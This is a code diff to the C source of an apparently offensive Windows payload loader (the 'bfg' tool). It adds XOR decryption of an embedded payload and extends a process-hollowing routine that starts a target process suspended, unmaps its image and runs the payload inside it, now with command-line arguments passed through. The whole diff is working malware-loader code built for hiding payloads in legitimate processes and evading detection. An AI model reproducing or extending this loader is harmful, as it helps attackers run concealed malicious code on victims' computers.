@@ -40,7 +40,7 @@ DWORD get_pid_by_name(char *imgname);
 #endif
 #ifdef PROCESS_HOLLOWING
 typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);
-void newRunPE(LPSTR szFilePath, PVOID pFile);
+void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine);
 #endif
 
 int main (int argc, char **argv)
@@ -143,9 +143,28 @@ int main (int argc, char **argv)
 	}
 	
 	#ifdef PROCESS_HOLLOWING
-	// Instanciate target process
-	// Target process specified in first bfg argument argv[1]	
-	newRunPE(argv[1], payload);
+		#ifdef XOR_OBFUSCATION
+			// Decrypt payload
+			// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
+			for(long i=0; i < payloadSize; i++)
+			{
+				payload[i] = payload[i] ^ keyByte;
+			}	
+		#endif
+	
+		// Instanciate target process
+		// Target process specified in first bfg argument argv[1]	
+		// Command line arguments for payload in second bfg argument argv[2]
+		if(!argv[2]) 
+		{
+			// Handle empty command line arguments for payload executable
+			// Relevant if user does not specify "" as second bfg argument
+			newRunPE(argv[1], payload, "");
+		} else
+		{
+			// Instanciate and pass command line arguments
+			newRunPE(argv[1], payload, argv[2]);
+		}	
 	#endif
 
 	#ifdef LOADEXEC_DLL
@@ -336,7 +355,7 @@ DWORD get_pid_by_name(char *imgname)
 #endif
 
 #ifdef PROCESS_HOLLOWING
-void newRunPE(LPSTR szFilePath, PVOID pFile) {
+void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 	PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
 	PIMAGE_NT_HEADERS INH;				// NT .EXE header
 	PIMAGE_SECTION_HEADER ISH;			// Section Header
@@ -362,7 +381,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile) {
 				RtlZeroMemory(&PI, sizeof(PI));				
 		
 				// Create new instance of target process		
-				if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+				if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
 					CTX = (PCONTEXT) VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE);
 					CTX->ContextFlags = CONTEXT_FULL;
 					
